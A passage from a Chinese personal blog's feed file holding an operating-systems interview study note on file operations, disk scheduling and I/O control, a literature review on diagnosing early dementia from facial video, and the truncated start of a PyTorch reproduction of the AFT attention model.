      <title>操作系统面经4：文件管理和输入输出管理</title>
      <link href="/2024/07/30/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%9D%A2%E7%BB%8F4%EF%BC%9A%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E5%92%8C%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%AE%A1%E7%90%86/"/>
      <url>/2024/07/30/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%9D%A2%E7%BB%8F4%EF%BC%9A%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E5%92%8C%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="1-文件管理"><a href="#1-文件管理" class="headerlink" title="1 文件管理"></a>1 文件管理</h1><p><img src="/2024/07/30/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%9D%A2%E7%BB%8F4%EF%BC%9A%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E5%92%8C%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%AE%A1%E7%90%86/image_t0PKuSaQzu.png"></p><h2 id="1-1-文件的基本操作？"><a href="#1-1-文件的基本操作？" class="headerlink" title="1.1 文件的基本操作？"></a>1.1 文件的基本操作？</h2><p>文件属于抽象数据类型。为了恰当地定义文件，就需要考虑有关文件的操作。操作系统提供系统调用，它对文件进行创建、写、读、定位和截断。</p><ol><li><p><strong>创建文件</strong>：创建文件有两个必要步骤，一是在文件系统中为文件找到空间；二是在目录中为新文件创建条目，该条目记录文件名称、在文件系统中的位置及其他可能信息。</p></li><li><p><strong>写文件</strong>：为了写文件，执行一个系统调用，指明文件名称和要写入文件的内容。对于给定文件名称，系统搜索目录以查找文件位置。系统必须为该文件维护一个写位置的指针。每当发生写操作，便更新写指针。</p></li><li><p><strong>读文件</strong>：为了读文件，执行一个系统调用，指明文件名称和要读入文件块的内存位置。同样，需要搜索目录以找到相关目录项，系统维护一个读位置的指针。每当发生读操作时，更新读指针。一个进程通常只对一个文件读或写，所以当前操作位置可作为每个进程当前文件位置指针。</p><p>由于读和写操作都使用同一指针，节省了空间也降低了系统复杂度。</p></li><li><p><strong>文件重定位（文件寻址）</strong>：按某条件搜索目录，将当前文件位置设为给定值，并且不会读、写文件。</p></li><li><p><strong>删除文件</strong>：先从目录中找到要删除文件的目录项，使之成为空项，然后回收该文件所占用的存储空间。</p></li><li><p><strong>截断文件</strong>：允许文件所有属性不变，并删除文件内容，即将其长度设为0并释放其空间。这6个基本操作可以组合执行其他文件操作。例如，一个文件的复制，可以创建新文件、 从旧文件读出并写入到新文件。</p></li></ol><h2 id="1-2-磁盘调度算法有哪些？"><a href="#1-2-磁盘调度算法有哪些？" class="headerlink" title="1.2 磁盘调度算法有哪些？"></a>1.2 磁盘调度算法有哪些？</h2><h3 id="1-2-1-先来先服务算法"><a href="#1-2-1-先来先服务算法" class="headerlink" title="1.2.1 先来先服务算法"></a>1.2.1 先来先服务算法</h3><p>先来先服务算法（<code>FCFS</code>）First Come First Service这是一种比较简单的磁盘调度算法。它根据进程请求访问磁盘的先后次序进行调度。</p><p>此算法的优点是公平、简单，且每个进程的请求都能依次得到处理，不会出现某一进程的请求长期得不到满足的情况。此算法由于未对寻道进行优化，在对磁盘的访问请求比较多的情况下，此算法将降低设备服务的吞吐量，致使平均寻道时间可能较长，但各进程得到服务的响应时间的变化幅度较小。</p><h3 id="1-2-2-最短寻道时间优先算法"><a href="#1-2-2-最短寻道时间优先算法" class="headerlink" title="1.2.2 最短寻道时间优先算法"></a>1.2.2 最短寻道时间优先算法</h3><p>最短寻道时间优先算法（SSTF） Shortest Seek Time First选择这样的进程，其要求访问的磁道与当前磁头所在的磁道距离最近，以使每次的寻道时间最短，该算法可以得到比较好的吞吐量，但却不能保证平均寻道时间最短。</p><p>其缺点是对用户的服务请求的响应机会不是均等的，因而导致响应时间的变化幅度很大。在服务请求很多的情况下，对内外边缘磁道的请求将会无限期的被延迟，有些请求的响应时间将不可预期。</p><h3 id="1-2-3-扫描算法"><a href="#1-2-3-扫描算法" class="headerlink" title="1.2.3 扫描算法"></a>1.2.3 扫描算法</h3><p>扫描算法（SCAN）电梯调度算法不仅考虑到欲访问的磁道与当前磁道的距离，更优先考虑的是磁头的当前移动方向。</p><p>例如，当磁头正在自里向外移动时，扫描算法所选择的下一个访问对象应是其欲访问的磁道既在当前磁道之外，又是距离最近的。这样自里向外地访问，直到再无更外的磁道需要访问才将磁臂换向，自外向里移动。这时，同样也是每次选择这样的进程来调度，即其要访问的磁道，在当前磁道之内，从而避免了饥饿现象的出现。由于这种算法中磁头移动的规律颇似电梯的运行，故又称为<strong>电梯调度算法</strong>。</p><p>此算法基本上克服了最短寻道时间优先算法的服务集中于中间磁道和响应时间变化比较大的缺点，而具有最短寻道时间优先算法的优点即吞吐量较大，平均响应时间较小，但由于是摆动式的扫描方法，两侧磁道被访问的频率仍低于中间磁道。</p><h3 id="1-2-4-循环扫描算法"><a href="#1-2-4-循环扫描算法" class="headerlink" title="1.2.4 循环扫描算法"></a>1.2.4 循环扫描算法</h3><p>循环扫描算法（<code>CSCAN</code>）是对扫描算法的改进。如果对磁道的访问请求是均匀分布的，当磁头到达磁盘的一端，并反向运动时落在磁头之后的访问请求相对较少。</p><p>这是由于这些磁道刚被处理，而磁盘另一端的请求密度相当高，且这些访问请求等待的时间较长，为了解决这种情况，循环扫描算法规定磁头单向移动。例如，只自里向外移动，当磁头移到最外的被访问磁道时，磁头立即返回到最里的欲访磁道，即将最小磁道号紧接着最大磁道号构成循环，进行扫描。</p><hr><h1 id="2-输入输出管理"><a href="#2-输入输出管理" class="headerlink" title="2 输入输出管理"></a>2 输入输出管理</h1><p><img src="/2024/07/30/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%9D%A2%E7%BB%8F4%EF%BC%9A%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E5%92%8C%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%AE%A1%E7%90%86/image_CS_cQasGSO.png"></p><h2 id="2-1-I-O控制方式有哪些？"><a href="#2-1-I-O控制方式有哪些？" class="headerlink" title="2.1 I&#x2F;O控制方式有哪些？"></a>2.1 I&#x2F;O控制方式有哪些？</h2><h3 id="2-1-1-程序查询方式"><a href="#2-1-1-程序查询方式" class="headerlink" title="2.1.1 程序查询方式"></a>2.1.1 程序查询方式</h3><p>早期的计算机系统中， 没有中断系统，所以CPU和I&#x2F;O设备进行通信，传输数据时CPU速度远快于I&#x2F;O设备，于是CPU需要不断测试I&#x2F;O设备，看其是否完成了传输。</p><p><img src="/2024/07/30/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%9D%A2%E7%BB%8F4%EF%BC%9A%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E5%92%8C%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%AE%A1%E7%90%86/image_nSmjZCCFtw.png"></p><h3 id="2-1-2-程序中断方式"><a href="#2-1-2-程序中断方式" class="headerlink" title="2.1.2 程序中断方式"></a>2.1.2 程序中断方式</h3><p>当某进程要启动某个 I&#x2F;O 设备工作时，便由 CPU 向相应的设备控制器发出一条 I&#x2F;O 命令，然后立即返回继续执行原来的任务。仅当输完一个数据时，才需 CPU 花费极短的时间去做些中断处理。</p><p><img src="/2024/07/30/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%9D%A2%E7%BB%8F4%EF%BC%9A%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E5%92%8C%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%AE%A1%E7%90%86/image_4KO5B61J4Y.png"></p><h3 id="2-1-3-DMA方式"><a href="#2-1-3-DMA方式" class="headerlink" title="2.1.3 DMA方式"></a>2.1.3 DMA方式</h3><p>DMA方式（直接存储器访问）通过在I&#x2F;O设备和内存之间开启一个可以直接传输数据的通路，采用<code>DMA</code>控制器来控制一个数据块的传输，CPU只需在一个数据块传输开始阶段设置好传输所需的控制信息，并在传输结束阶段做进一步处理。</p><p><img src="/2024/07/30/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%9D%A2%E7%BB%8F4%EF%BC%9A%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E5%92%8C%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%AE%A1%E7%90%86/image_ytyQNc1AYx.png"></p><h3 id="2-1-4-I-O通道控制方式"><a href="#2-1-4-I-O通道控制方式" class="headerlink" title="2.1.4 I&#x2F;O通道控制方式"></a>2.1.4 I&#x2F;O通道控制方式</h3><p>虽然<code>DMA</code>方式比起中断方式来已经显著地减少了CPU的干预，即已由以字（节）为单位的干预减少到以数据块为单位的干预。但CPU每发出一条I&#x2F;O指令，也只能去读&#x2F;写一个连续的数据块。而当我们需要一次去读多个数据块且将它们分别传送到不同的内存区域，或者相反时，则需由CPU分别发出多条I&#x2F;O指令及进行多次中断处理才能完成。</p><ul><li>通道控制方式与<code>DMA</code>控制方式类似，也是一种以内存为中心，实现设备与内存直接交换数据的控制方式。</li><li>与<code>DMA</code>控制方式相比，通道方式所需要的CPU干预更少，而且可以做到一个通道控制多台设备，从而进一步减轻了CPU负担。</li><li>通道本质上是一个简单的处理器，专门负责输入、输出控制，具有执行I&#x2F;O指令的能力，并通过执行通道I&#x2F;O程序来控制I&#x2F;O操作。</li><li>通道的指令系统比较简单，一般只有数据传送指令、设备控制指令等。</li></ul><h2 id="2-2-Spooling技术？"><a href="#2-2-Spooling技术？" class="headerlink" title="2.2 Spooling技术？"></a>2.2 Spooling技术？</h2><p>虚拟性是OS的四大特性之一。如果说可以通过多道程序技术将一台物理CPU虚拟为多台逻辑CPU，从而允许多个用户共享一台主机，那么，通过<code>SPOOling</code>技术便可将一台物理I&#x2F;O设备虚拟为多台逻辑I&#x2F;O设备，同样允许多个用户共享一台物理I&#x2F;O设备。</p><p><code>SPOOLing</code>技术是对脱机输入、输出系统的模拟。相应地，<code>SPOOLing</code>系统必须建立在具有多道程序功能的操作系统上，而且还应有高速随机外存的支持，这通常是采用磁盘存储技术。</p><p><code>SPOOLing</code>系统主要有以下三部分：</p><ol><li><strong>输入井和输出井</strong>：这是在磁盘上开辟的两个大存储空间。输入井是模拟脱机输入时的磁盘设备，用于暂存I&#x2F;Q设备输入的数据；输出井是模拟脱机输出时的磁盘，用于暂存用户程序的输出数据。</li><li><strong>输入缓冲区和输出缓冲区</strong>：为了缓和和CPU和磁盘之间速度不匹配的矛盾，在内存中要开辟两个缓冲区；输入缓冲区和输出缓冲区。输入缓冲区用于暂存由输入设备送来的数据，以后再传送到输入井。输出缓冲区用与暂存从输出井送来的数据，以后在传送给输出设备。</li><li><strong>输入进程</strong>**<code>SPi</code><strong><strong>和输入进程</strong></strong><code>SP0</code>**：这里利用两个进程来模拟脱机I&#x2F;O时的外围控制机。其中，进程<code>SPi</code>模拟脱机输入时的外围控制机，将用户要求的数据从输入机通过输入缓冲区再送到输入井，当CPU需要输入数据时，直接从输入井读入内存；进程<code>SP0</code>模拟脱机输出时的外围控制机，把用户要求输出的数据从先内存送到输出井，待输出设备空闲时，在将输出井中的数据经过输出缓冲区送到输出设备上。</li></ol><p><code>SPOOLing</code>技术的特点：</p><ol><li><strong>提高了I&#x2F;O速度</strong>：从对低速I&#x2F;O设备进行的I&#x2F;O操作变为对输入井或输出井的操作，如同脱机操作一样，提高了I&#x2F;O速度，缓和了CPU与低速I&#x2F;O设备速度不匹配的矛盾。</li><li><strong>将独占设备改造为共享设备</strong>：因为在<code>SPOOLing</code>系统的系统中，实际上并没为任何进程分配设备，而知识在输入井或输出井中为进程分配一个存储区和建立一张I&#x2F;O请求表。这样，便把独占设备改造为共享设备。</li><li><strong>实现了虚拟设备功能</strong>：多个进程同时使用一独享设备，而对每一进程而言，都认为自己独占这一设备，从而实现了设备的虚拟分配。不过，该设备是逻辑上的设备。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
            <tag> 面经 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于脸部视频图像的早期老年痴呆诊断技术综述</title>
      <link href="/2024/07/29/%E5%9F%BA%E4%BA%8E%E8%84%B8%E9%83%A8%E8%A7%86%E9%A2%91%E5%9B%BE%E5%83%8F%E7%9A%84%E6%97%A9%E6%9C%9F%E8%80%81%E5%B9%B4%E7%97%B4%E5%91%86%E8%AF%8A%E6%96%AD%E6%8A%80%E6%9C%AF%E7%BB%BC%E8%BF%B0/"/>
      <url>/2024/07/29/%E5%9F%BA%E4%BA%8E%E8%84%B8%E9%83%A8%E8%A7%86%E9%A2%91%E5%9B%BE%E5%83%8F%E7%9A%84%E6%97%A9%E6%9C%9F%E8%80%81%E5%B9%B4%E7%97%B4%E5%91%86%E8%AF%8A%E6%96%AD%E6%8A%80%E6%9C%AF%E7%BB%BC%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="1-摘要"><a href="#1-摘要" class="headerlink" title="1 摘要"></a>1 摘要</h1><p>老年痴呆症是一种起病隐匿、呈进展性发展的神经系统退行性疾病。随着人口老龄化加剧，早期诊断老年痴呆对于阻止疾病发展至关重要。其中，基于脸部视频图像的老年痴呆诊断技术通过捕捉和分析患者的面部表情、动作等信息，为非侵入性诊断提供了新途径。综述近些年使用计算机视觉来进行面部识别进而诊断老年痴呆症相关的研究，尽管面临患者间面部特征差异大、诊断模型普适性不足等挑战，但该技术仍展现出巨大潜力，有望为老年痴呆症的早期诊断和防治工作带来新突破。</p><hr><h1 id="2-引言"><a href="#2-引言" class="headerlink" title="2 引言"></a>2 引言</h1><p>老年痴呆症作为一种随着全球人口老龄化趋势日益严峻而愈发普遍的神经退行性疾病，已成为全球主要的致残和致死原因之一。据统计，全球约有5500万人受到痴呆症的影响，其中最常见的类型包括阿尔茨海默病$^{\mathrm{[1]}}$（AD）、血管性痴呆、路易体痴呆（LBD）和额颞叶痴呆（FTD）。这类疾病不仅给患者本人的生活质量带来严重影响，也给家庭和社会带来了沉重的负担。然而，由于早期阶段的准确诊断方法匮乏，许多患者在症状明显时才得以确诊，从而错过了早期干预和治疗的最佳时机。</p><p>在老年痴呆症的复杂病程中，其发病过程呈现为一个高度渐进、持续恶化的动态演变，在这一过程中患者的认知功能、行为模式及日常生活自理能力逐渐衰退。研究通常将这一过程细分为几个关键阶段，包括正常对照组（NC），即未表现出认知功能下降的健康个体；主观记忆抱怨组（SMC），个体主观上报告记忆减退但客观测试未见显著异常；轻度认知功能障碍（MCI），进一步细分为早期（EMCI）和晚期（LMCI），前者标志着认知功能轻度损害的初现，后者则更接近于阿尔茨海默病（AD）的临床诊断标准；最终发展为AD，即认知功能全面衰退的终末阶段。需要注意在MCI阶段，特别是其早期阶段（EMCI），可以进行早期识别，有助于延缓并阻止病情向AD发展。据统计，在65岁及以上的老年人群中，近40%的MCI患者在未来五年内会进展为AD。因此，科学研究正致力于探索MCI早期的生物标志物、深入剖析其病理机制，并开发有效的干预策略，以期实现老年痴呆症的早期预防与干预，从而延缓或阻止疾病的进展。</p><p>传统的老年痴呆症诊断方法主要依赖于临床表现、病史询问、智力评估和脑部影像学检查$^{\mathrm{[2]}}$等，但这些方法存在主观性强$^{\mathrm{[3]}}$、侵入性高、费用昂贵且耗时较长等局限性。因此，寻找一种更为准确、便捷且无创的早期诊断方法，对于改善痴呆症患者的临床管理和开发更有效的治疗策略具有重大意义。</p><p>近年来，随着医学技术$^{\mathrm{[4-5]}}$尤其是人工智能$^{\mathrm{[6]}}$和计算机视觉$^{\mathrm{[7]}}$技术的飞速发展，基于脸部视频图像的早期老年痴呆诊断技术逐渐成为研究的热点。脸部视频图像$^{\mathrm{[8]}}$作为一种非侵入性的数据源，包含了丰富的表情、动态信息和面部特征，这些特征与人脑的认知功能和神经系统状态密切相关。通过分析脸部视频图像中的微妙变化，如面部表情、眼球运动以及面部肌肉活动的细微差异，可以间接反映大脑的认知状态和潜在病变，从而为痴呆症的早期诊断提供新的思路和方法。</p><p>基于脸部视频图像$^{\mathrm{[9-10]}}$的早期老年痴呆诊断技术不仅有望突破传统诊断方法的局限性，提高诊断的准确性和便捷性，还为痴呆症的早期干预和治疗提供了新的可能性。</p><hr><h1 id="3-研究方法"><a href="#3-研究方法" class="headerlink" title="3 研究方法"></a>3 研究方法</h1><p>脸部视频图像技术已成为评估个体认知功能及神经系统状态的重要工具，该技术深度融合了图像处理、计算机视觉以及前沿的人工智能技术，实现了对复杂面部信息的精细捕捉与智能分析。在老年痴呆症的早期筛查与诊断中，该技术更是展现出独特优势，能够敏锐捕捉患者面部表情的微妙差异及眼球运动$^{\mathrm{[11]}}$的细微变化，为疾病的早期诊断提供了坚实而客观的依据。</p><p>深度学习通过构建深度神经网络架构，从海量数据中自动挖掘并提取高维抽象特征，其在处理复杂模式识别任务时展现出了非凡的效能。在计算机视觉领域，深度学习技术，尤其是卷积神经网络（CNN），凭借其强大的特征提取与学习能力，能够精准地从脸部视频图像中解构出与认知功能衰退密切相关的局部特征与空间布局，广泛应用于图像分类、目标检测及图像语义分割等前沿领域。</p><h2 id="3-1-OpenFace面部识别工具包"><a href="#3-1-OpenFace面部识别工具包" class="headerlink" title="3.1 OpenFace面部识别工具包"></a>3.1 OpenFace面部识别工具包</h2><p>随着人工智能与计算机视觉技术的飞速发展，面部识别与情绪分析在多个领域展现出了巨大的应用潜力。其中，OpenFace$^{\mathrm{[12]}}$作为一款由卡内基梅隆大学研发的开源工具包，凭借其先进的深度学习模型和高效的算法设计，成为了该领域内的佼佼者。</p><p>OpenFace的核心是深度神经网络模型，这些模型经过大量面部图像数据的训练，能够高精度地识别出人脸的关键点，并实时追踪面部肌肉的细微变化。特别是其采用的卷积神经网络（CNN）和Active Appearance Models（AAMs）技术，使得OpenFace在处理光照变化、遮挡等复杂场景时，仍能保持较高的准确性和鲁棒性。此外，OpenFace的多元化功能为其在多个领域的应用提供了可能。在人机交互领域，OpenFace能够捕捉并分析用户的面部表情，从而提供更加自然、直观的用户界面；在市场研究与广告领域，通过分析消费者情绪，OpenFace能够为市场营销策略的制定提供有力的数据支持；在教育与健康领域，OpenFace能够监测学生的注意力和情绪状态，辅助诊断心理或神经系统疾病；在生物识别安全系统领域，OpenFace则能够提供高精度的身份验证解决方案，增强系统的安全性。</p><h2 id="3-2-国内研究现状"><a href="#3-2-国内研究现状" class="headerlink" title="3.2 国内研究现状"></a>3.2 国内研究现状</h2><p>在国内，基于脸部视频图像技术的老年痴呆早期诊断研究正蓬勃兴起，吸引了众多科研团队的关注与投入。Ching-Fang Chien等$^{\mathrm{[13]}}$（2023）的研究便是这一领域的杰出代表。他们创新性地提出了一种基于面部不对称性的评估方法来区分阿尔茨海默病患者与健康人群。该研究利用先进的三维相机技术，精准捕捉面部图像，并借助OpenFace这一强大的开源机器学习算法，实现了对面部68个关键标志点的自动识别与追踪。通过细致比较这29对面部地标的不对称性，研究人员深入剖析了AD患者与对照组在面部特征上的差异。</p><p>AD患者群体在面部边缘、眉毛、眼睛、鼻孔及嘴巴等多个区域展现出显著的不对称性，这一发现与未患痴呆的对照组存在明显差异。这一成果不仅揭示了面部不对称性在AD诊断中的潜在价值，为基于脸部视频图像的老年痴呆早期诊断技术开辟了新的思路。</p><p><img src="/2024/07/29/%E5%9F%BA%E4%BA%8E%E8%84%B8%E9%83%A8%E8%A7%86%E9%A2%91%E5%9B%BE%E5%83%8F%E7%9A%84%E6%97%A9%E6%9C%9F%E8%80%81%E5%B9%B4%E7%97%B4%E5%91%86%E8%AF%8A%E6%96%AD%E6%8A%80%E6%9C%AF%E7%BB%BC%E8%BF%B0/image_dXnvOlssVV.png"></p><center>图3.1  OpenFace的图像配准过程示例</center><p>国内研究团队还开发了基于人工智能的老年痴呆症辅助诊断系统。例如，暨南大学的研究团队$^{\mathrm{[14]}}$提出了一种基于视频数据的老年痴呆症辅助诊断系统，该系统通过采集受试者泡茶任务操作过程的视频，利用神经网络进行人物交互识别及患病健康状态诊断。这种非侵入式的诊断方式不仅提高了诊断的便捷性，还减轻了医生的工作负担。</p><h2 id="3-3-国外研究现状"><a href="#3-3-国外研究现状" class="headerlink" title="3.3 国外研究现状"></a>3.3 国外研究现状</h2><p>2020年，Uiseo Nam等人$^{\mathrm{[15]}}$发现面部和眼球运动的客观和准确测量可用于快速诊断阿尔茨海默病。通过比较AD患者和认知正常人群患者的面部和眼球运动模式，以分析痴呆的神经体征。在检测面部标志后，使用Spearman相关系数来检查水平和垂直面部和眼球运动之间的关联。</p><p>为了获取阿尔茨海默氏症患者的眼睛和面部运动数据，如图3.2所示，首先从参与者的视频中提取面部和眼睛坐标值。研究发现阿尔茨海默病组的凝视方差在所有方向上都明显大于正常组。认知能力下降的症状之一是注意力下降，这会导致频繁的眼球运动和面部运动。当认知能力恶化时，一旦检测到目标物体，集中注意力的能力就会降低，眼球运动量也会增加。</p><p><img src="/2024/07/29/%E5%9F%BA%E4%BA%8E%E8%84%B8%E9%83%A8%E8%A7%86%E9%A2%91%E5%9B%BE%E5%83%8F%E7%9A%84%E6%97%A9%E6%9C%9F%E8%80%81%E5%B9%B4%E7%97%B4%E5%91%86%E8%AF%8A%E6%96%AD%E6%8A%80%E6%9C%AF%E7%BB%BC%E8%BF%B0/image_1_BmN_fZdIva.png"></p><center>图3.2  OpenFace 2.0的面部和眼球运动提取</center><p>研究人员认为，阿尔茨海默氏症患者凝视的这些变化是由于额叶和顶叶的损伤造成的；已知这些区域的缺陷与阿尔茨海默病过程中注意力不集中有关，导致扫视和平稳追踪的启动和抑制缺陷，因此患者可能会有更高程度的面部运动，以克服这些问题。所以，测量的异常眼球运动可以作为筛查阿尔茨海默病的标志。由此可见，基于相机的测试早期发现显示神经退行性变迹象的患者会促进了痴呆症的早期诊断技术的发展。</p><p>2021年，Yumi Umeda-Kameyama等人$^{\mathrm{[16]}}$现使用Xception等深度学习程序能够区分轻度痴呆症患者和非痴呆症患者的面部。即面部AI评分与MMSE和实际年龄之间存在显著相关性，其中，MMSE评分与面部AI评分的相关性明显强于实际年龄。</p><p>这项研究的结果为开发一种使用人工智能的非侵入性、廉价和快速的认知障碍筛查工具奠定了基础，为未来开发痴呆症面部生物标志物的研究铺平了道路。</p><p>此外，考纳斯理工大学（KTU）的研究人员$^{\mathrm{[17]}}$电图仪数据，分析了阿尔茨海默病患者与健康人在处理面部背景信息时的差异。研究发现，阿尔茨海默病患者的大脑信号比健康人更为嘈杂，这与他们更难集中注意力和处理视觉信息有关。这一发现揭示了面部表情与认知功能之间的密切关系，为基于脸部视频图像的诊断技术提供了新的视角。</p><hr><h1 id="4-展望与未来的挑战"><a href="#4-展望与未来的挑战" class="headerlink" title="4 展望与未来的挑战"></a>4 展望与未来的挑战</h1><p>经对近年来的文献进行深入研究，可以发现基于脸部视频图像技术的早期老年痴呆病诊断是此领域的主要研究方向。这一领域取得的显著进步，源于深度学习方法的持续创新和应用。这些方法不仅在数量上呈增长趋势，同时在精度和效率上也实现了显著的提升。然而，仍然存在一些问题和挑战有待解决。例如，为了进一步提高模型的准确率，需要解决模型对于面部表情多样性的适应问题。此外，此项技术还需得到更广泛的应用和推广，以便让更多潜在的老年痴呆症患者从中受益。</p><p>此外，当前公开可用的、专门用于早期老年痴呆症诊断的脸部视频图像数据集极为有限。数据标注的困难也是导致数据集缺乏的重要原因之一。基于脸部视频图像的早期老年疾病诊断依赖于对细微面部变化的准确捕捉和分析，这需要高度专业的医学知识和丰富的临床经验。在收集和使用脸部视频图像数据时，必须严格遵守相关法律法规和伦理规范，确保患者的隐私权益得到充分保护。</p><p>在未来的研究中，可以融合各种生物特征进行综合分析，旨在探索并确定不同生物标记物的最优组合。同时应将研究重心放在提升这些技术在临床诊断中的可行性与实用性上，不仅要追求技术上的先进性，更要确保这些技术能够真正服务于患者，提高阿尔茨海默症等老年痴呆疾病的早期诊断准确率，从而在临床实践中发挥更大的综合价值。通过这样的努力，基于脸部视频图像技术的早期老年痴呆诊断技术将在老年疾病研究领域展现出更加广阔的应用前景和深远的社会意义。</p><hr><h1 id="5-参考文献"><a href="#5-参考文献" class="headerlink" title="5 参考文献"></a>5 参考文献</h1><ol><li>Dubois, B.; Feldman, H.H.; Jacova, C.; DeKosky, S.T.; Barberger-Gateau, P.; Cummings, J.; Delacourte, A.; Galasko, D.; Gauthier, S.; Jicha, G.; et al. Research criteria for the diagnosis of Alzheimer’s disease: Revising the NINCDS-ADRDA criteria. Lancet Neurol. 2007, 6, 734–746.</li><li>CHOULIARAS L, O’BRIEN J. The use of neuroimaging techniques in the early and differential diagnosis of dementia[J].</li><li>DOWNS M G. THE ROLE OF GENERAL PRACTICE AND THE PRIMARY CARE TEAM IN DEMENTIA DIAGNOSIS AND MANAGEMENT[J&#x2F;OL]. International Journal of Geriatric Psychiatry, 1996, 11(11): 937-942.</li><li>SO A, HOOSHYAR D, PARK K, et al. Early Diagnosis of Dementia from Clinical Data by Machine Learning Techniques[J&#x2F;OL]. Applied Sciences, 2017: 651.</li><li>SCHÖNECKER S, BRENDEL M, HUBER M, et al. Applied multimodal diagnostics in a case of presenile dementia[J&#x2F;OL]. BMC Neurology, 2016.</li><li>HOSNY A, PARMAR C, QUACKENBUSH J, et al. Artificial intelligence in radiology[J&#x2F;OL]. Nature Reviews Cancer, 2018: 500-510.</li><li>KRIZHEVSKY A, SUTSKEVER I, HINTON G E. ImageNet Classification with Deep Convolutional Neural Networks[J&#x2F;OL]. Communications of the ACM, 2017: 84-90.</li><li>ZHANG C, XU X, TU D. Face Detection Using Improved Faster RCNN.[J]. Cornell University - arXiv,Cornell University - arXiv, 2018.</li><li>严严, 章毓晋. 基于视频的人脸识别研究进展[J].</li><li>白子轶, 毛懿荣, 王瑞平. 视频人脸识别进展综述[J]. 计算机科学, 2021, 48(03): 50-59.</li><li>NAM U, LEE K, KO H, et al. Analyzing Facial and Eye Movements to Screen for Alzheimer’s Disease[J&#x2F;OL]. Sensors, 2020: 5349.</li><li>BALTRUSAITIS T, ZADEH A, LIM Y C, et al. OpenFace 2.0: Facial Behavior Analysis Toolkit[C&#x2F;OL]&#x2F;&#x2F;2018 13th IEEE International Conference on Automatic Face &amp;amp; Gesture Recognition (FG 2018), Xi’an. 2018.</li><li>Chien, C.-F.; Sung, J.-L.; Wang, C.-P.; Yen, C.-W.; Yang, Y.-H. Analyzing Facial Asymmetry in Alzheimer’s Dementia Using Image-Based Technology. Biomedicines 2023, 11, 2802.</li><li>陶倩, 雷小林. (2023). 基于视频数据的老年痴呆症辅助诊断系统及其方法. 发明专利申请公布号CN 116580832. 公布日期, 2023年8月11日.</li><li>NAM U, LEE K, KO H, et al. Analyzing Facial and Eye Movements to Screen for Alzheimer’s Disease[J&#x2F;OL]. Sensors, 2020: 5349.</li><li>UMEDA-KAMEYAMA Y, KAMEYAMA M, TANAKA T, et al. Screening of Alzheimer’s disease by facial complexion using artificial intelligence[J&#x2F;OL]. Aging, 2021: 1765-1772.</li><li>KOMOLOVAITĖ D, MASKELIŪNAS R, DAMAŠEVIČIUS R. Deep Convolutional Neural Network-Based Visual Stimuli Classification Using Electroencephalography Signals of Healthy and Alzheimer’s Disease Subjects[J&#x2F;OL]. Life, 2022: 374.</li></ol>]]></content>
      
      
      <categories>
          
          <category> 科研 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 综述 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>论文AFT代码复现</title>
      <link href="/2024/07/28/%E8%AE%BA%E6%96%87AFT%E4%BB%A3%E7%A0%81%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/07/28/%E8%AE%BA%E6%96%87AFT%E4%BB%A3%E7%A0%81%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="1-AFT-simple"><a href="#1-AFT-simple" class="headerlink" title="1 AFT-simple"></a>1 AFT-simple</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AFT_Simple</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, dim, hidden_dim=<span class="number">64</span>, **kwargs</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="variable language_">self</span>.w_q = nn.Linear(dim, hidden_dim)</span><br><span class="line">        <span class="variable language_">self</span>.w_k = nn.Linear(dim, hidden_dim)</span><br><span class="line">        <span class="variable language_">self</span>.w_v = nn.Linear(dim, hidden_dim)</span><br><span class="line">        <span class="variable language_">self</span>.out = nn.Linear(hidden_dim, dim)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        B, H, W, C = x.shape</span><br><span class="line">        x = x.reshape(B, -<span class="number">1</span>, C)</span><br><span class="line"></span><br><span class="line">        q = <span class="variable language_">self</span>.w_q(x)</span><br><span class="line">        k = <span class="variable language_">self</span>.w_k(x)</span><br><span class="line">        v = <span class="variable language_">self</span>.w_v(x)</span><br><span 